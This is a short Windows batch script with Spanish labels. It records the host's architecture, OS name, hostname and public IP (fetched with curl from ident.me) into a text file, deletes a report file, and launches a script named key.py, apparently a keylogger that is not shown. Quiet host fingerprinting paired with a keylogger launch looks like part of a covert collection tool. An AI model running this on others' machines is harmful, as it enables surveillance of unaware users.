@echo off
echo Arquitectura: %PROCESSOR_ARCHITECTURE% > datos.txt
SYSTEMINFO | FINDSTR /B /C:"Nombre del sistema operativo" /C:"Nombre de host" >> datos.txt
echo Direccion de IP: >> datos.txt
curl https://ident.me >> datos.txt

del reporte.txt
start key.py
